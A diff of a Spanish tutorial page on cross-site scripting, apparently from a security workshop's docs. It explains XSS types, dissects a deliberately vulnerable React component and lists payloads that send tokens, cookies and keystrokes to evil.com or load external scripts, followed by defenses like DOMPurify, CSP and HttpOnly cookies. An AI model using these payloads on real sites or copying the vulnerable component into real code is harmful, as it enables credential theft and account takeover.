@@ -1,433 +1,472 @@
 ---
-sidebar_position: 5
+sidebar_position: 2
 title: "Cross-Site Scripting (XSS)"
 ---
 
-## 3. Cross-Site Scripting (XSS)
+# Cross-Site Scripting (XSS)
 
-### 3.1 ¿Qué es XSS?
+## ¿Qué es XSS?
 
-Un atacante inyecta JavaScript malicioso que se ejecuta en el navegador de otros usuarios.
+Cross-Site Scripting (XSS) es una de las vulnerabilidades web más comunes y peligrosas. Permite a un atacante inyectar código JavaScript malicioso en páginas web que serán ejecutadas en el navegador de otros usuarios. A diferencia de otros ataques que se dirigen directamente al servidor, XSS ataca a los usuarios de tu aplicación aprovechando la confianza que el navegador tiene en el contenido que recibe de tu sitio.
 
-### 3.2 Tipos de XSS
+Cuando un usuario visita una página con código XSS inyectado, su navegador no puede distinguir entre el JavaScript legítimo de tu aplicación y el código malicioso del atacante. Ambos se ejecutan con los mismos privilegios, lo que significa que el atacante puede hacer todo lo que tu aplicación puede hacer: leer cookies, acceder a localStorage, hacer peticiones a tu API, modificar el DOM, e incluso redirigir al usuario a sitios de phishing.
 
-**Reflected XSS** (Reflejado):
-```javascript
-// ❌ VULNERABLE
-app.get('/search', (req, res) => {
-  const query = req.query.q;
-  res.send(`<h1>Resultados para: ${query}</h1>`);
-});
+### ¿Por qué es tan peligroso?
 
-// Ataque: GET /search?q=<script>alert('XSS')</script>
-```
+El impacto de XSS va mucho más allá de mostrar un simple `alert()`. Un ataque XSS exitoso puede:
 
-**Stored XSS** (Almacenado):
-```javascript
-// ❌ VULNERABLE
-app.post('/comment', async (req, res) => {
-  const { text } = req.body;
-  await Comment.create({ text }); // Guarda sin sanitizar
-  res.redirect('/comments');
-});
+1. **Robo de credenciales**: El atacante puede capturar cookies de sesión, tokens JWT almacenados en localStorage, o interceptar credenciales que el usuario escribe en formularios.
 
-app.get('/comments', async (req, res) => {
-  const comments = await Comment.find();
-  // Si renderizas con innerHTML o dangerouslySetInnerHTML
-  // el script se ejecutará
-});
-```
+2. **Suplantación de identidad**: Con acceso al token de autenticación, el atacante puede realizar cualquier acción en nombre de la víctima: modificar su perfil, eliminar datos, enviar mensajes, o realizar transacciones.
 
-## 🛡️ Prevención de XSS
+3. **Distribución de malware**: El script inyectado puede redirigir a usuarios a sitios maliciosos o iniciar descargas automáticas de software malicioso.
 
-La prevención de XSS requiere **múltiples capas de defensa**. Ninguna técnica sola es suficiente.
+4. **Keylogging**: El atacante puede registrar cada tecla que el usuario presiona en la página, capturando contraseñas, números de tarjeta de crédito, y otra información sensible.
 
-### **1. Sanitización en el Backend** 🧹
+5. **Defacement**: Modificar el contenido visible de la página para mostrar información falsa, propaganda, o dañar la reputación de la empresa.
 
-**Regla de oro**: **Nunca confíes en datos del usuario**. Sanitiza SIEMPRE antes de guardar o renderizar.
-
-#### Usando DOMPurify (Isomorphic)
-
-```bash
-npm install isomorphic-dompurify
-```
-
-```javascript
-import DOMPurify from 'isomorphic-dompurify';
-
-app.post('/comments', async (req, res) => {
-  const comment = req.body.comment;
-  
-  // Sanitizar ANTES de guardar en DB
-  const cleanComment = DOMPurify.sanitize(comment, {
-    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
-    ALLOWED_ATTR: ['href'],
-    ALLOW_DATA_ATTR: false,
-  });
-  
-  await Comment.create({ text: cleanComment });
-  res.json({ success: true });
-});
-
-// Ejemplo de sanitización:
-// Input:  '<script>alert("XSS")</script><p>Comentario legítimo</p>'
-// Output: '<p>Comentario legítimo</p>'
-```
-
-**Configuraciones de DOMPurify**:
-
-```javascript
-// Configuración estricta (solo texto)
-const textOnly = DOMPurify.sanitize(input, {
-  ALLOWED_TAGS: [],
-  KEEP_CONTENT: true, // Mantiene texto, elimina tags
-});
-
-// Configuración para rich text
-const richText = DOMPurify.sanitize(input, {
-  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'a'],
-  ALLOWED_ATTR: ['href', 'title'],
-  ALLOWED_URI_REGEXP: /^https?:\/\//, // Solo HTTP/HTTPS
-});
-
-// Configuración para markdown procesado
-const markdown = DOMPurify.sanitize(markdownHTML, {
-  ALLOWED_TAGS: ['p', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'],
-  ALLOWED_ATTR: ['class'],
-});
-```
+6. **Criptominería**: Utilizar los recursos del navegador de la víctima para minar criptomonedas sin su conocimiento.
 
 ---
 
-### **2. Escapado en el Frontend** ⚛️
+## Tipos de XSS
 
-#### React: Auto-Escapado por Defecto
+Existen tres tipos principales de XSS, cada uno con un vector de ataque diferente y diferentes niveles de persistencia:
+
+### Stored XSS (Persistente)
+
+El código malicioso se almacena permanentemente en el servidor (base de datos, sistema de archivos, etc.) y se entrega a todos los usuarios que acceden al recurso afectado.
+
+```text
+┌─────────────────────────────────────────────────────────────────────┐
+│                        STORED XSS                                   │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. INYECCIÓN                                                       │
+│     ┌─────────┐                           ┌─────────┐               │
+│     │ Atacante│ ────POST /comments────►   │ Servidor│               │
+│     └─────────┘                           └─────────┘               │
+│                  Comentario:                    │                   │
+│                  "<script>                      │                   │
+│                    fetch('evil.com?c='+         │                   │
+│                    document.cookie)             ▼                   │
+│                  </script>"               ┌─────────┐               │
+│                                           │   DB    │               │
+│  2. ALMACENAMIENTO                        │ Guarda  │               │
+│                                           │ script  │               │
+│                                           └─────────┘               │
+│                                                 │                   │
+│  3. ENTREGA A VÍCTIMAS                          │                   │
+│     ┌─────────┐                           ┌─────┴───┐               │
+│     │ Víctima │ ◄────GET /comments────── │ Servidor│               │
+│     │    A    │   HTML con <script>      └─────────┘               │
+│     └─────────┘                                 │                   │
+│          │                                      │                   │
+│     ┌─────────┐                                 │                   │
+│     │ Víctima │ ◄───────────────────────────────┘                   │
+│     │    B    │   Mismo script malicioso                            │
+│     └─────────┘                                                     │
+│          │                                                          │
+│  4. TODOS LOS VISITANTES EJECUTAN EL SCRIPT                         │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+**Escenarios típicos de Stored XSS:**
+- Comentarios en blogs o foros
+- Perfiles de usuario (nombre, biografía)
+- Mensajes privados
+- Descripciones de productos
+- Cualquier campo que se guarde y se muestre a otros usuarios
+
+### Reflected XSS (No persistente)
+
+El código malicioso se incluye en la URL o en los parámetros de una petición y se "refleja" inmediatamente en la respuesta del servidor. El ataque requiere que la víctima haga clic en un enlace malicioso.
+
+```text
+┌─────────────────────────────────────────────────────────────────────┐
+│                        REFLECTED XSS                                │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. El atacante crea una URL maliciosa:                             │
+│     https://sitio.com/search?q=<script>evil()</script>              │
+│                                                                     │
+│  2. La envía a la víctima (email, mensaje, redes sociales)          │
+│                                                                     │
+│  3. La víctima hace clic                                            │
+│     ┌─────────┐                           ┌─────────┐               │
+│     │ Víctima │ ────GET /search?q=...──►  │ Servidor│               │
+│     └─────────┘                           └─────────┘               │
+│                                                 │                   │
+│  4. El servidor incluye el parámetro en la respuesta                │
+│                                                 │                   │
+│     ┌─────────┐                           ┌─────┴───┐               │
+│     │ Víctima │ ◄────HTML con <script>─── │ Servidor│               │
+│     └─────────┘   "Resultados para:       └─────────┘               │
+│          │        <script>evil()</script>"                          │
+│          │                                                          │
+│  5. El navegador ejecuta el script                                  │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+**Escenarios típicos de Reflected XSS:**
+- Páginas de búsqueda que muestran "Resultados para: [término]"
+- Mensajes de error que incluyen el input del usuario
+- Páginas de login con mensajes como "Usuario [nombre] no encontrado"
+- Cualquier página que muestre datos de la URL
+
+### DOM-based XSS
+
+El código malicioso nunca pasa por el servidor. La vulnerabilidad existe completamente en el JavaScript del cliente, que toma datos de una fuente controlable por el atacante (URL, localStorage, etc.) y los usa de forma insegura.
+
+```text
+┌─────────────────────────────────────────────────────────────────────┐
+│                        DOM-BASED XSS                                │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. URL maliciosa:                                                  │
+│     https://sitio.com/page#<img src=x onerror=evil()>               │
+│                                                                     │
+│  2. El servidor NO procesa el fragmento (después del #)             │
+│     Solo devuelve la página HTML normal                             │
+│                                                                     │
+│  3. El JavaScript de la página lee el hash:                         │
+│                                                                     │
+│     // Código vulnerable en la página                               │
+│     const hash = location.hash.substring(1);                        │
+│     document.getElementById('content').innerHTML = hash;            │
+│     // ❌ Inyecta el payload directamente en el DOM                 │
+│                                                                     │
+│  4. El navegador ejecuta el script inyectado                        │
+│                                                                     │
+│  NOTA: El servidor nunca vio el payload malicioso                   │
+│        WAFs y logs del servidor no detectan el ataque               │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+**Escenarios típicos de DOM-based XSS:**
+- Código que lee `location.hash` o `location.search`
+- Uso de `innerHTML` con datos del DOM
+- Evaluación de parámetros de URL con `eval()` o `Function()`
+- Frameworks que bindean datos sin sanitizar
+
+---
+
+## Ejemplo Real: Vulnerabilidad en Taller-Testing-Security
+
+El proyecto **Taller-Testing-Security** incluye un componente intencionalmente vulnerable para demostración educativa. Veamos el código en detalle:
+
+### El código vulnerable
 
 ```tsx
-// ✅ SEGURO: React escapa automáticamente
-function Comment({ text }: { text: string }) {
+// ui/src/components/routes/Admin.tsx
+
+import { ChangeEvent, useState } from "react";
+import { EvilDiv } from "./Admin.styled";
+
+export const Admin = () => {
+  // Estado que almacena el input del usuario
+  const [evilInput, setEvilInput] = useState("");
+
+  // Handler que actualiza el estado con cada cambio
+  function onChangeEvilInput(e: ChangeEvent<HTMLInputElement>) {
+    setEvilInput(e.target.value);
+  }
+
   return (
     <div>
-      <p>{text}</p>
-      {/* Input: <script>alert('XSS')</script> */}
-      {/* Renderizado: &lt;script&gt;alert('XSS')&lt;/script&gt; */}
+      <h1>Panel de Administración</h1>
+      <p>Introduce una URL de imagen para previsualizarla:</p>
+      
+      {/* Campo de entrada para URL */}
+      <input 
+        type="text" 
+        onChange={onChangeEvilInput} 
+        placeholder="https://ejemplo.com/imagen.png"
+        style={{ width: '400px', padding: '8px' }}
+      />
+      
+      {/* ❌ VULNERABLE: dangerouslySetInnerHTML con input sin sanitizar */}
+      <EvilDiv
+        dangerouslySetInnerHTML={{
+          __html: `<img style="width: 200px;" src="${evilInput}"/>`,
+        }}
+      />
     </div>
   );
-}
-
-// ❌ PELIGROSO: dangerouslySetInnerHTML bypassa escapado
-function Comment({ html }: { html: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: html }} />;
-  // ¡Solo usar con contenido YA sanitizado en backend!
-}
-
-// ✅ SEGURO: Combina backend sanitization + dangerouslySetInnerHTML
-function RichComment({ unsafeHTML }: { unsafeHTML: string }) {
-  // Sanitizar en cliente también (defense in depth)
-  const cleanHTML = DOMPurify.sanitize(unsafeHTML);
-  
-  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
-}
+};
 ```
 
-#### Vanilla JavaScript: Escapado Manual
+### Análisis de la vulnerabilidad
+
+El problema está en la línea que usa `dangerouslySetInnerHTML`:
+
+```tsx
+__html: `<img style="width: 200px;" src="${evilInput}"/>`
+```
+
+Aquí, el valor de `evilInput` se interpola directamente dentro de un string que luego se interpreta como HTML. Esto significa que el atacante puede "romper" la sintaxis del tag `<img>` e inyectar sus propios atributos o tags.
+
+### Explotación paso a paso
+
+**Paso 1: Input normal**
+
+Si el usuario introduce una URL válida como `https://vitejs.dev/logo.png`:
+
+```html
+<!-- HTML resultante -->
+<img style="width: 200px;" src="https://vitejs.dev/logo.png"/>
+```
+
+La imagen se muestra correctamente. Todo funciona como esperado.
+
+**Paso 2: Input malicioso**
+
+Si el atacante introduce:
+```
+x" onerror="alert('XSS!')
+```
+
+El HTML resultante es:
+```html
+<img style="width: 200px;" src="x" onerror="alert('XSS!')"/>
+```
+
+El navegador intenta cargar la imagen `x`, falla porque no es una URL válida, y ejecuta el handler `onerror` con el código del atacante.
+
+**Paso 3: Payload real de ataque**
+
+Un atacante real usaría un payload más sofisticado:
 
 ```javascript
-// ❌ VULNERABLE: innerHTML con input no sanitizado
-const search = new URLSearchParams(window.location.search).get('q');
-document.getElementById('results').innerHTML = `<h1>Results for: ${search}</h1>`;
+x" onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))
+```
 
-// ✅ SEGURO: textContent (escapa automáticamente)
-const search = new URLSearchParams(window.location.search).get('q');
-document.getElementById('results').textContent = `Results for: ${search}`;
+HTML resultante:
+```html
+<img style="width: 200px;" src="x" onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))"/>
+```
 
-// ✅ SEGURO: createElement + textContent
-const search = new URLSearchParams(window.location.search).get('q');
-const h1 = document.createElement('h1');
-h1.textContent = `Results for: ${search}`;
-document.getElementById('results').appendChild(h1);
+Esto envía el token JWT del usuario al servidor del atacante.
 
-// ✅ SEGURO: Función de escapado manual
-function escapeHTML(str) {
-  const div = document.createElement('div');
-  div.textContent = str;
-  return div.innerHTML;
-}
+### Variantes del payload
 
-const search = new URLSearchParams(window.location.search).get('q');
-document.getElementById('results').innerHTML = `<h1>Results for: ${escapeHTML(search)}</h1>`;
+Hay múltiples formas de explotar esta vulnerabilidad:
+
+```javascript
+// Robar cookies
+x" onerror="new Image().src='https://evil.com/?c='+document.cookie
+
+// Keylogger
+x" onerror="document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}
+
+// Redirección a phishing
+x" onerror="location='https://evil-phishing-site.com'
+
+// Modificar el DOM
+x" onerror="document.body.innerHTML='<h1>Sitio hackeado</h1>'
+
+// Ejecutar script externo
+x"><script src="https://evil.com/malware.js"></script><img src="x
 ```
 
 ---
 
-### **3. Content Security Policy (CSP)** 🔒
+## Prevención de XSS
 
-**CSP es una capa adicional** que limita qué scripts pueden ejecutarse, incluso si XSS bypassa sanitización.
+### 1. Nunca usar `dangerouslySetInnerHTML` (cuando sea posible)
 
-#### Configuración con Helmet.js
+React escapa automáticamente todo el contenido que renderizas mediante JSX. Los caracteres especiales como `<`, `>`, `"`, `'`, `&` se convierten en entidades HTML inofensivas.
+
+```tsx
+// ❌ INSEGURO: dangerouslySetInnerHTML permite HTML sin escapar
+<div dangerouslySetInnerHTML={{ __html: userContent }} />
+
+// ✅ SEGURO: React escapa automáticamente
+<div>{userContent}</div>
+```
+
+Si el usuario intenta inyectar `<script>alert('XSS')</script>`, React lo convierte en texto plano:
+```html
+<div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+```
+
+El navegador muestra literalmente `<script>alert('XSS')</script>` como texto, sin ejecutarlo.
+
+### 2. Si necesitas HTML: Usa DOMPurify
+
+A veces realmente necesitas renderizar HTML del usuario (editores WYSIWYG, contenido rich text, markdown convertido a HTML). En esos casos, **siempre** sanitiza primero:
+
+```tsx
+import DOMPurify from 'dompurify';
+
+function SafeHTML({ html }: { html: string }) {
+  // DOMPurify elimina todo lo peligroso:
+  // - <script> tags
+  // - Atributos on* (onclick, onerror, etc.)
+  // - javascript: URLs
+  // - data: URLs en ciertos contextos
+  // - Y muchos otros vectores
+  
+  const sanitizedHTML = DOMPurify.sanitize(html, {
+    // Solo permitir estos tags
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
+    // Solo permitir estos atributos
+    ALLOWED_ATTR: ['href', 'target', 'rel'],
+    // Forzar links a abrirse en nueva pestaña con noopener
+    ADD_ATTR: ['target', 'rel'],
+  });
+  
+  return <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />;
+}
+
+// Ejemplo de uso
+<SafeHTML html={userComment} />
+```
+
+**Ejemplo de sanitización:**
 
 ```javascript
+const maliciousHTML = `
+  <p>Texto normal</p>
+  <script>alert('XSS')</script>
+  <img src="x" onerror="evil()">
+  <a href="javascript:evil()">Click aquí</a>
+`;
+
+const clean = DOMPurify.sanitize(maliciousHTML, {
+  ALLOWED_TAGS: ['p', 'a'],
+  ALLOWED_ATTR: ['href']
+});
+
+// Resultado: '<p>Texto normal</p><a>Click aquí</a>'
+// - <script> eliminado completamente
+// - <img> eliminado (no está en ALLOWED_TAGS)
+// - javascript: URL eliminada del href
+```
+
+### 3. Content Security Policy (CSP)
+
+CSP es un header HTTP que le dice al navegador qué recursos puede cargar y ejecutar. Es tu última línea de defensa: incluso si hay una vulnerabilidad XSS, CSP puede prevenir la ejecución del script malicioso.
+
+```typescript
+// Configuración en Express con Helmet
 import helmet from 'helmet';
 
-// Configuración básica (estricta)
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: ["'self'"], // Solo scripts del mismo origen
-    styleSrc: ["'self'"],
-    imgSrc: ["'self'", "data:", "https:"],
-    connectSrc: ["'self'"],
-    fontSrc: ["'self'"],
-    objectSrc: ["'none'"], // Deshabilita Flash, etc.
-    mediaSrc: ["'self'"],
-    frameSrc: ["'none'"], // Previene clickjacking
-    upgradeInsecureRequests: [],
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      // Solo cargar recursos de nuestro origen
+      defaultSrc: ["'self'"],
+      
+      // Scripts: solo de nuestro origen, nada inline
+      scriptSrc: ["'self'"],
+      // ¡Sin 'unsafe-inline' ni 'unsafe-eval'!
+      
+      // Estilos: permitir inline para CSS-in-JS frameworks
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      
+      // Imágenes: nuestro origen + data URIs + HTTPS externo
+      imgSrc: ["'self'", "data:", "https:"],
+      
+      // Conexiones API: nuestro origen + CDNs específicos
+      connectSrc: ["'self'", "https://api.example.com"],
+      
+      // Frames: bloquear completamente
+      frameAncestors: ["'none'"],
+      
+      // Formularios: solo a nuestro origen
+      formAction: ["'self'"],
+    },
   },
 }));
-
-// Configuración para SPAs (React/Vue) con inline scripts
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: [
-      "'self'",
-      // EVITAR 'unsafe-inline' en producción
-      // En su lugar, usar nonces o hashes
-    ],
-    styleSrc: ["'self'", "'unsafe-inline'"], // Necesario para styled-components
-    imgSrc: ["'self'", "data:", "https:"],
-    connectSrc: ["'self'", "https://api.myapp.com"],
-  },
-}));
-
-// Configuración con NONCES (recomendado para inline scripts)
-import crypto from 'crypto';
-
-app.use((req, res, next) => {
-  res.locals.nonce = crypto.randomBytes(16).toString('base64');
-  next();
-});
-
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    scriptSrc: [
-      "'self'",
-      (req, res) => `'nonce-${res.locals.nonce}'`,
-    ],
-  },
-}));
-
-// En el HTML
-app.get('/', (req, res) => {
-  res.send(`
-    <html>
-      <head>
-        <script nonce="${res.locals.nonce}">
-          console.log('Este script es permitido');
-        </script>
-      </head>
-    </html>
-  `);
-});
 ```
 
-**Directivas CSP más importantes**:
+**Cómo CSP bloquea XSS:**
 
-| Directiva | Descripción | Ejemplo |
-|-----------|-------------|----------|
-| `default-src` | Fallback para otras directivas | `'self'` |
-| `script-src` | Fuentes permitidas para JS | `'self' https://cdn.example.com` |
-| `style-src` | Fuentes permitidas para CSS | `'self' 'unsafe-inline'` |
-| `img-src` | Fuentes para imágenes | `'self' data: https:` |
-| `connect-src` | Orígenes para fetch/XHR | `'self' https://api.myapp.com` |
-| `font-src` | Fuentes para fonts | `'self' https://fonts.gstatic.com` |
-| `object-src` | Plugins (Flash, etc.) | `'none'` |
-| `frame-src` | Orígenes para iframes | `'none'` o `'self'` |
-| `upgrade-insecure-requests` | Fuerza HTTPS | (sin valor) |
+```html
+<!-- Si un atacante inyecta esto: -->
+<script>alert('XSS')</script>
 
-**Valores especiales**:
+<!-- El navegador ve que es un inline script -->
+<!-- CSP dice: scriptSrc: ["'self'"] (solo scripts de nuestro dominio) -->
+<!-- Inline scripts no tienen origen = bloqueado -->
 
-- `'self'`: Mismo origen que la página
-- `'none'`: Bloquea todo
-- `'unsafe-inline'`: Permite inline scripts/styles (⚠️ evitar)
-- `'unsafe-eval'`: Permite eval() (⚠️ evitar)
-- `'nonce-<random>'`: Permite script específico con nonce
-- `'sha256-<hash>'`: Permite script con hash específico
-
-**Ejemplo de CSP reportando violaciones**:
-
-```javascript
-app.use(helmet.contentSecurityPolicy({
-  directives: {
-    defaultSrc: ["'self'"],
-    scriptSrc: ["'self'"],
-    reportUri: '/api/csp-report', // Endpoint para recibir reportes
-  },
-  reportOnly: false, // false = bloquea, true = solo reporta
-}));
-
-// Endpoint que recibe violaciones CSP
-app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
-  console.log('CSP Violation:', req.body);
-  
-  // Loguear violación
-  securityLogger.warn('CSP Violation', {
-    document: req.body['csp-report']['document-uri'],
-    violated: req.body['csp-report']['violated-directive'],
-    blocked: req.body['csp-report']['blocked-uri'],
-  });
-  
-  res.status(204).end();
-});
+<!-- Mensaje en consola: -->
+<!-- Refused to execute inline script because it violates the 
+     Content-Security-Policy directive: "script-src 'self'" -->
 ```
 
----
+### 4. Cookies HttpOnly
 
-### **4. Validación de Inputs** ✅
-
-**Whitelist sobre Blacklist**: Define qué es permitido, no qué está bloqueado.
+Protege los tokens de sesión para que no sean accesibles desde JavaScript:
 
 ```typescript
-import Joi from 'joi';
-
-// Schema de validación para comentarios
-const commentSchema = Joi.object({
-  text: Joi.string()
-    .max(500)
-    .pattern(/^[a-zA-Z0-9\s.,!?'-]+$/) // Solo caracteres alfanuméricos y puntuación
-    .required(),
-  author: Joi.string()
-    .alphanum()
-    .min(3)
-    .max(30)
-    .required(),
-});
-
-app.post('/comments', async (req, res) => {
-  const { error, value } = commentSchema.validate(req.body);
-  
-  if (error) {
-    return res.status(400).json({ errors: error.details });
-  }
-  
-  // value está validado, pero aún sanitizar antes de guardar
-  const cleanText = DOMPurify.sanitize(value.text);
-  
-  await Comment.create({ text: cleanText, author: value.author });
-  res.json({ success: true });
+res.cookie('sessionToken', token, {
+  httpOnly: true,  // No accesible via document.cookie
+  secure: true,    // Solo enviar por HTTPS
+  sameSite: 'strict',  // No enviar en requests cross-origin
+  maxAge: 3600000  // Expiración en ms
 });
 ```
 
----
-
-### **5. HTTPOnly Cookies** 🍪
-
-Previene que JavaScript acceda a cookies (protege contra robo de sesión).
+Con `httpOnly: true`, incluso si un atacante logra ejecutar XSS, no puede robar la cookie de sesión:
 
 ```javascript
-app.use(session({
-  secret: process.env.SESSION_SECRET,
-  cookie: {
-    httpOnly: true, // JavaScript no puede leer document.cookie
-    secure: process.env.NODE_ENV === 'production', // Solo HTTPS
-    sameSite: 'strict', // Previene CSRF también
-    maxAge: 24 * 60 * 60 * 1000, // 24 horas
-  },
-}));
-
-// Tokens JWT en cookies HttpOnly
-res.cookie('token', jwtToken, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'strict',
-  maxAge: 3600000, // 1 hora
-});
+// Código del atacante (XSS)
+document.cookie  // No incluye la cookie httpOnly
+fetch('https://evil.com/?cookie=' + document.cookie);  // Cookie de sesión no enviada
 ```
 
-**Comparación**:
+### 5. Escapar según el contexto
 
-```javascript
-// ❌ VULNERABLE: Token en localStorage (accesible por XSS)
-localStorage.setItem('token', jwtToken);
-// Atacante puede: localStorage.getItem('token')
-
-// ✅ SEGURO: Token en HttpOnly cookie (no accesible por JS)
-res.cookie('token', jwtToken, { httpOnly: true });
-// Atacante NO puede acceder desde JavaScript
-```
-
----
-
-## 🧪 Testing de XSS
-
-### Tests Automatizados
+Diferentes contextos requieren diferentes tipos de escape:
 
 ```typescript
-// tests/xss.test.ts
-import request from 'supertest';
-import app from '../app';
+// Contexto HTML: escapar < > & " '
+const htmlEscape = (str: string) => str
+  .replace(/&/g, '&amp;')
+  .replace(/</g, '&lt;')
+  .replace(/>/g, '&gt;')
+  .replace(/"/g, '&quot;')
+  .replace(/'/g, '&#39;');
 
-describe('XSS Protection', () => {
-  const xssPayloads = [
-    '<script>alert("XSS")</script>',
-    '<img src=x onerror="alert(\'XSS\')">',
-    '<svg onload="alert(\'XSS\')">',
-    'javascript:alert("XSS")',
-    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-  ];
-  
-  it('debe sanitizar comentarios con scripts', async () => {
-    for (const payload of xssPayloads) {
-      const res = await request(app)
-        .post('/api/comments')
-        .send({ text: payload });
-      
-      expect(res.status).toBe(200);
-      
-      // Verificar que el payload fue sanitizado
-      const comments = await request(app).get('/api/comments');
-      const savedComment = comments.body.find(c => c.text.includes('script') || c.text.includes('onerror'));
-      expect(savedComment).toBeUndefined();
-    }
-  });
-  
-  it('debe incluir CSP header', async () => {
-    const res = await request(app).get('/');
-    
-    expect(res.headers['content-security-policy']).toBeDefined();
-    expect(res.headers['content-security-policy']).toContain("default-src 'self'");
-  });
-  
-  it('debe configurar cookies con httpOnly', async () => {
-    const res = await request(app)
-      .post('/api/login')
-      .send({ email: 'test@example.com', password: 'password123' });
-    
-    const cookies = res.headers['set-cookie'];
-    expect(cookies).toBeDefined();
-    expect(cookies[0]).toContain('HttpOnly');
-  });
-});
+// Contexto atributo HTML: además, usar comillas dobles
+<div title="${htmlEscape(userInput)}">
+
+// Contexto JavaScript: usar JSON.stringify
+<script>
+  const userData = ${JSON.stringify(userData)};
+</script>
+
+// Contexto URL: usar encodeURIComponent
+<a href="/search?q=${encodeURIComponent(searchTerm)}">
+
+// Contexto CSS: evitar input de usuario en CSS, o sanitizar estrictamente
+// ❌ Nunca: style="color: ${userInput}"
 ```
 
 ---
 
-## 📚 Resumen: Checklist Anti-XSS
+## Checklist de Prevención XSS
 
-- [ ] **Sanitizar SIEMPRE inputs** con DOMPurify antes de guardar
-- [ ] **Escapar outputs** al renderizar (React hace esto por defecto)
-- [ ] **Configurar CSP estricto** con Helmet.js (evitar `'unsafe-inline'`)
-- [ ] **Validar inputs** con Joi/Zod (whitelist de caracteres)
-- [ ] **HttpOnly cookies** para tokens/sesiones (no localStorage)
-- [ ] **Evitar `dangerouslySetInnerHTML`** o sanitizar antes
-- [ ] **No usar `eval()`, `innerHTML` con datos del usuario**
-- [ ] **Testear con payloads XSS comunes** en tests automatizados
-- [ ] **Monitorear violaciones CSP** con reportUri
+```text
+□ No usar dangerouslySetInnerHTML excepto cuando sea absolutamente necesario
+□ Si usas dangerouslySetInnerHTML, siempre sanitizar con DOMPurify primero
+□ Configurar Content-Security-Policy sin 'unsafe-inline' en script-src
+□ Usar cookies HttpOnly para tokens de sesión
+□ Escapar output según el contexto (HTML, JavaScript, URL, CSS)
+□ Validar y sanitizar input en el backend también
+□ Usar frameworks que escapan por defecto (React, Vue, Angular)
+□ Revisar código que usa innerHTML, document.write, eval, Function()
+□ Configurar X-Content-Type-Options: nosniff
+□ Auditar dependencias por vulnerabilidades XSS conocidas
+```
 
-:::tip Defense in Depth
-**Múltiples capas**: Si una falla (ej: sanitización), CSP aún protege. Si CSP falla, HttpOnly cookies previenen robo de sesión.
-:::
+---
 
-:::warning Frameworks Modernos
-React, Vue, Angular **escapan por defecto**, pero `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` bypasan protecciones. **Úsalos solo con datos sanitizados**.
-:::
+## Próximo Paso
+
+Ahora que entiendes XSS, continuemos con otra vulnerabilidad crítica que afecta a usuarios autenticados. Dirígete a **[Cross-Site Request Forgery (CSRF)](./csrf)**.
